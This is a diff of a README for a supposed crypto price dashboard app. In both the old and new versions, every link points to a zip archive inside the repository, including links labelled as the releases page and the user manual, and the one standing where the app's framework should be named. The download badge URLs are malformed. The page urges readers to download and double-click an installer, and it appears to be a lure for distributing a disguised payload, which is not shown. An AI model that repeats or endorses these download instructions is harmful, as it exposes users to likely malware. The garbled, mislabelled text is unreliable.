@@ -1,10 +1,10 @@
 # 🚀 crypto-dashboard-app - Your Easy Crypto Tracker 
 
 ## 📥 Download the App
-[![Download Now](https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip%https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip)](https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip)
+[![Download Now](https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip%https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip)](https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip)
 
 ## 📖 Overview
-The crypto-dashboard-app is a real-time crypto screener and dashboard application built using https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip and the CoinGecko API. It provides an intuitive interface for users to monitor cryptocurrency prices and trends effortlessly. Whether you are a casual investor or just curious about the market, this app helps you stay informed about your favorite cryptocurrencies.
+The crypto-dashboard-app is a real-time crypto screener and dashboard application built using https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip and the CoinGecko API. It provides an intuitive interface for users to monitor cryptocurrency prices and trends effortlessly. Whether you are a casual investor or just curious about the market, this app helps you stay informed about your favorite cryptocurrencies.
 
 ## ⚙️ Features
 - **Real-Time Tracking:** Monitor live cryptocurrency prices and changes.
@@ -23,7 +23,7 @@ The crypto-dashboard-app is a real-time crypto screener and dashboard applicatio
 To get started with the crypto-dashboard-app, follow these straightforward steps:
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip) to find the latest version of the app.
+Go to the [Releases page](https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip) to find the latest version of the app.
 
 ### Step 2: Download the Application
 Look for the latest release, and download the installation file that matches your operating system. 
@@ -35,7 +35,7 @@ Once the download is complete, locate the file on your system. Double-click the 
 After the installation is finished, you can find the app in your applications folder or on your desktop. Open the app, and you are ready to explore the world of cryptocurrencies!
 
 ## 📥 Download & Install
-To download the software, visit this page: [crypto-dashboard-app Releases](https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip). Once there, select the version suitable for your system and click on it to start the download. After downloading, follow the installation steps outlined above.
+To download the software, visit this page: [crypto-dashboard-app Releases](https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip). Once there, select the version suitable for your system and click on it to start the download. After downloading, follow the installation steps outlined above.
 
 ## 🖥️ Using the App
 1. **Open the App:** Launch the crypto-dashboard-app from your applications.
@@ -51,7 +51,7 @@ If you encounter issues during installation or while using the app:
 
 ## 🌟 Additional Resources
 To further enhance your experience, consider exploring the following resources:
-- **Documentation:** [User Manual](https://raw.githubusercontent.com/Muh-BenitoDwiki27/crypto-dashboard-app/main/components/home/app_dashboard_crypto_v2.2.zip)
+- **Documentation:** [User Manual](https://github.com/Muh-BenitoDwiki27/crypto-dashboard-app/raw/refs/heads/main/public/assets/app_crypto_dashboard_v1.6-beta.2.zip)
 - **Community Support:** Join discussions on GitHub Issues or forums related to crypto tracking.
 
 ## 🐛 Feedback
